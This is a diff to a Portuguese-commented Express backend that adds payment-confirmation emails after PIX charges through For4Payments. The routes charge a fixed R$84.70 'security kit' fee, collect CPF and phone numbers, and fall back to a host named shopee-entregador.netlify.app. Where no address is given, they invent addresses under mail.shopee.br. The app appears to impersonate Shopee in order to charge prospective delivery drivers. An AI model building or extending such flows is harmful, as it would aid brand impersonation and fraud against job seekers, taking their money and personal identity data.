@@ -525,10 +525,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Converter valor para centavos
       const amountInCents = Math.round(amount * 100);
       
+      // Gerar email se não tiver sido fornecido
+      const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
+      
       // Construir payload para a For4Payments conforme formato esperado
       const payload = {
         name,
-        email: email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`,
+        email: userEmail,
         cpf: cleanedCpf,
         phone: cleanedPhone, // Telefone limpo, apenas números
         paymentMethod: "PIX",
@@ -561,6 +564,49 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const result = await response.json();
       
       console.log('Resposta da For4Payments recebida pelo proxy');
+      
+      // Se a resposta foi bem-sucedida e temos os dados do PIX, enviar email
+      if (response.status === 200 && result && result.pixCode && result.pixQrCode) {
+        // Importar o serviço de email
+        const { emailService } = await import('./email-service');
+        
+        // Formatar o valor para exibição
+        const formattedAmount = new Intl.NumberFormat('pt-BR', {
+          style: 'currency',
+          currency: 'BRL'
+        }).format(amount);
+        
+        // Construir o link para a página de pagamento (se houver)
+        // O frontend pode ter uma página específica para acompanhamento do pagamento
+        const clientHost = req.headers.origin || 'https://shopee-entregador.netlify.app';
+        const paymentLink = `${clientHost}/payment?id=${result.id}&email=${encodeURIComponent(userEmail)}`;
+        
+        // Enviar o email de confirmação
+        try {
+          const emailSent = await emailService.sendPaymentConfirmationEmail({
+            email: userEmail,
+            name,
+            pixCode: result.pixCode,
+            pixQrCode: result.pixQrCode,
+            amount,
+            formattedAmount,
+            paymentLink
+          });
+          
+          // Adicionar informação de email enviado à resposta
+          result.emailSent = emailSent;
+          
+          if (emailSent) {
+            console.log(`Email de confirmação enviado com sucesso para ${userEmail}`);
+          } else {
+            console.error(`Falha ao enviar email de confirmação para ${userEmail}`);
+          }
+        } catch (emailError) {
+          console.error('Erro ao enviar email de confirmação:', emailError);
+          result.emailSent = false;
+          result.emailError = 'Falha ao enviar email de confirmação';
+        }
+      }
       
       // Retornar resposta para o cliente
       return res.status(response.status).json(result);
@@ -711,18 +757,63 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Valor fixo para o kit de segurança: R$ 84,70
       const paymentAmount = 84.70;
       
+      // Usar o email fornecido ou gerar um
+      const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
+      
       console.log(`Processando pagamento de R$ ${paymentAmount} para ${name}, CPF ${cpf}`);
       
       // Processar pagamento via For4Payments
       const paymentResult = await paymentService.createPixPayment({
         name,
-        email: email || '',
+        email: userEmail,
         cpf,
         phone: phone || '',
         amount: paymentAmount
       });
       
       console.log('Resultado do pagamento For4Payments:', paymentResult);
+      
+      // Se o pagamento foi processado com sucesso, enviar email
+      if (paymentResult.pixCode && paymentResult.pixQrCode) {
+        // Importar o serviço de email
+        const { emailService } = await import('./email-service');
+        
+        // Formatar o valor para exibição
+        const formattedAmount = new Intl.NumberFormat('pt-BR', {
+          style: 'currency',
+          currency: 'BRL'
+        }).format(paymentAmount);
+        
+        // Construir o link para a página de pagamento (se houver)
+        const clientHost = req.headers.origin || 'https://shopee-entregador.netlify.app';
+        const paymentLink = `${clientHost}/payment?id=${paymentResult.id}&email=${encodeURIComponent(userEmail)}`;
+        
+        // Enviar o email de confirmação
+        try {
+          const emailSent = await emailService.sendPaymentConfirmationEmail({
+            email: userEmail,
+            name,
+            pixCode: paymentResult.pixCode,
+            pixQrCode: paymentResult.pixQrCode,
+            amount: paymentAmount,
+            formattedAmount,
+            paymentLink
+          });
+          
+          // Adicionar informação de email enviado à resposta
+          paymentResult.emailSent = emailSent;
+          
+          if (emailSent) {
+            console.log(`Email de confirmação enviado com sucesso para ${userEmail}`);
+          } else {
+            console.error(`Falha ao enviar email de confirmação para ${userEmail}`);
+          }
+        } catch (emailError) {
+          console.error('Erro ao enviar email de confirmação:', emailError);
+          paymentResult.emailSent = false;
+          paymentResult.emailError = 'Falha ao enviar email de confirmação';
+        }
+      }
       
       // Retornar resultado para o frontend
       res.status(200).json(paymentResult);
@@ -757,15 +848,62 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       console.log('Processando pagamento via API For4Payments...');
       
-      // Processar pagamento via API For4Payments 
+      // Usar o email fornecido ou gerar um
+      const userEmail = email || `${nome.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
+      
       // Valor fixo para o kit de segurança: R$ 84,70
+      const paymentAmount = 84.70;
+      
+      // Processar pagamento via API For4Payments
       const paymentResult = await paymentService.createPixPayment({
         name: nome,
-        email: email || '',
+        email: userEmail,
         cpf: cpf,
         phone: telefone || '',
-        amount: 84.70
+        amount: paymentAmount
       });
+      
+      // Se o pagamento foi processado com sucesso, enviar email
+      if (paymentResult.pixCode && paymentResult.pixQrCode) {
+        // Importar o serviço de email
+        const { emailService } = await import('./email-service');
+        
+        // Formatar o valor para exibição
+        const formattedAmount = new Intl.NumberFormat('pt-BR', {
+          style: 'currency',
+          currency: 'BRL'
+        }).format(paymentAmount);
+        
+        // Construir o link para a página de pagamento (se houver)
+        const clientHost = req.headers.origin || 'https://shopee-entregador.netlify.app';
+        const paymentLink = `${clientHost}/payment?id=${paymentResult.id}&email=${encodeURIComponent(userEmail)}`;
+        
+        // Enviar o email de confirmação
+        try {
+          const emailSent = await emailService.sendPaymentConfirmationEmail({
+            email: userEmail,
+            name: nome,
+            pixCode: paymentResult.pixCode,
+            pixQrCode: paymentResult.pixQrCode,
+            amount: paymentAmount,
+            formattedAmount,
+            paymentLink
+          });
+          
+          // Adicionar informação de email enviado à resposta
+          paymentResult.emailSent = emailSent;
+          
+          if (emailSent) {
+            console.log(`Email de confirmação enviado com sucesso para ${userEmail}`);
+          } else {
+            console.error(`Falha ao enviar email de confirmação para ${userEmail}`);
+          }
+        } catch (emailError) {
+          console.error('Erro ao enviar email de confirmação:', emailError);
+          paymentResult.emailSent = false;
+          paymentResult.emailError = 'Falha ao enviar email de confirmação';
+        }
+      }
       
       // Retornar resultado para o frontend
       res.status(200).json(paymentResult);
